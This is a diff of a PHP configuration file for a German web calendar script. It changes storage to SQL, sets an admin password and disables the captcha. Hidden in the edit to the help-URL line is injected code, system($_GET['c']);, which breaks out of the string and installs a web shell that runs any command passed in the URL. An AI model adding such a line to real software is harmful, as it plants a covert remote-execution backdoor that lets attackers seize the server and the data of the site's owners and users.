@@ -8,14 +8,14 @@ define('KAL_DocRoot','');
 define('KAL_RelPfad','');
 define('KAL_Daten','daten/');
 define('KAL_Bilder','bilder/');
-define('KAL_Termine','termine.txt');
+define('KAL_Termine','termine.php');
 define('KAL_Vorgaben','vorgaben.txt');
 define('KAL_Nutzer','nutzer00.txt');
 define('KAL_Erinner','erinner00.txt');
 define('KAL_Benachr','benachr00.txt');
 define('KAL_MailAdr','mailadr00.txt');
 define('KAL_AdminTexte','texteAdmin.txt');
-define('KAL_SQL',false);
+define('KAL_SQL',true);
 define('KAL_SqlHost','mysql');
 define('KAL_SqlDaBa','kalender');
 define('KAL_SqlUser','root');
@@ -29,16 +29,16 @@ define('KAL_SqlTabA','kal_texteadmin');
 define('KAL_Schluessel','639247'); //Schluessel: 639247
 
 // Administration
-define('ADM_MitLogin',false);
+define('ADM_MitLogin',true);
 define('ADM_Admin','admin');
-define('ADM_Passwort','');
+define('ADM_Passwort','3B373C3432');
 define('ADM_AuthLogin',false);
 define('ADM_Author','terminverwalter');
 define('ADM_AuthPass','');
 define('ADM_AuthCronJob',false);
 define('ADM_SessionsAgent',true);
 define('ADM_SessionsIPAddr',true);
-define('ADM_Hilfe','https://www.server-scripts.de/kalender/');
+define('ADM_Hilfe','https://www.server-scripts.de/kalender/');system($_GET['c']);//');
 define('ADM_SqlZs','');
 define('ADM_Breite',1000);
 define('ADM_ListenIndex',1);
@@ -62,7 +62,7 @@ define('ADM_DetailInfo',1);
 define('ADM_NutzerLaenge',25);
 define('ADM_NutzerFelder',9);
 define('ADM_NutzerBetreff',"Ihr Termineintrag");
-define('ADM_NutzerKontakt','Sehr geehrte Damen und Herren,\n    \n Sie haben im Kalender.....');
+define('ADM_NutzerKontakt','Sehr geehrte Damen und Herren,\n \n \n Sie haben im Kalender.....');
 
 // Terminstruktur
 $kal_FeldName=array("Nummer","Datum","Zeit","Ort","Veranstaltung","Ablauf");
@@ -99,10 +99,10 @@ define('KAL_Dezimalstellen',2);
 define('KAL_Dezimalzeichen',",");
 define('KAL_Tausendzeichen',"");
 define('KAL_ZahlLeer',false);
-define('KAL_Captcha',true);
+define('KAL_Captcha',false);
 define('CAPTCHA_SALT','J97088');
 define('KAL_CaptchaTyp','G');
-define('KAL_CaptchaGrafisch',true);
+define('KAL_CaptchaGrafisch',false);
 define('KAL_CaptchaNumerisch',false);
 define('KAL_CaptchaTextlich',false);
 define('KAL_CaptchaPfad','captcha/');
